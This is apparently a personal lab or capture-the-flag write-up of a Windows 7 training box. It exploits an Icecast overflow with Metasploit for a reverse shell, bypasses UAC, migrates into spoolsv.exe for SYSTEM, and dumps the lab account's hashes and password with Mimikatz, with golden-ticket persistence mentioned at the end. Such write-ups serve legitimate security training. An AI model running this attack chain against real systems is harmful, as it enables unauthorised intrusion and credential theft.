# ICE ROOM

## Recon

~~~
nmap -sS -sV --script=vuln
~~~

DARK-PC
port 8000 has Icecast runing on it

## Gaining Access

https://www.cvedetails.com/ shows that a excute code overflow vulnerability exists.
Called CVE-2004-1561

~~~
msfconsole
use icecast
set LHOST tun0
set RHOST <room IP address>
run
~~~

This gives a meterpreter shell

## Esculate

~~~
sysinfo 

Computer        : DARK-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows

getuid

Server username: Dark-PC\Dark
~~~

esculate privilage

~~~
run post/multi/recon/local_exploit_suggester
~~~

**On my local system (msf6, kali rolling) exploit/windows/local/bypassuac_eventvwr isn't
listed as a exploit**

So I ran to bypass UAC

~~~
search exploit/windows/local/bypassuac_eventvwr
set session=>1
run
~~~

getprivs shows this account has SeTakeOwnershipPrivilege

## Looting

I need to move to a process that can interact with the lsass service. I need to be
living in a process that is the same architecture and permissions as the lsass.
Printer spool does this and will restart if it is crashed.

Often when I take over a running program we ultimately load another shared 
library into the program (a dll) which includes our malicious code. 
From this, I can spawn a new thread that hosts our shell. 

~~~
migrate -N spoolsv.exe 
~~~

getuid NT AUTHORITY\SYSTEM (full admin).

To get passwords use Mimikatz

~~~
load kiwi
creds_all (retrieve all credentials)

Username  Domain   LM                                NTLM                              SHA1
--------  ------   --                                ----                              ----
Dark      Dark-PC  e52cac67419a9a22ecb08369099ed302  7c4fe5eada682714a036e39378362bab  0d082c4b4f2aeafb67fd0ea568a997e9d3ebc0eb

wdigest credentials
===================

Username  Domain     Password
--------  ------     --------
(null)    (null)     (null)
DARK-PC$  WORKGROUP  (null)
Dark      Dark-PC    Password01!

tspkg credentials
=================

Username  Domain   Password
--------  ------   --------
Dark      Dark-PC  Password01!

kerberos credentials
====================

Username  Domain     Password
--------  ------     --------
(null)    (null)     (null)
Dark      Dark-PC    Password01!
dark-pc$  WORKGROUP  (null)

~~~

Mimikatz allows to steal darks password out of memory as Icecast runs scheduled tasks
as Dark.

golden_ticket_create (Mimikatz module) abuses a component to Kerberos 
(the authentication system in Windows domains) to maintain persistence as 
any user.



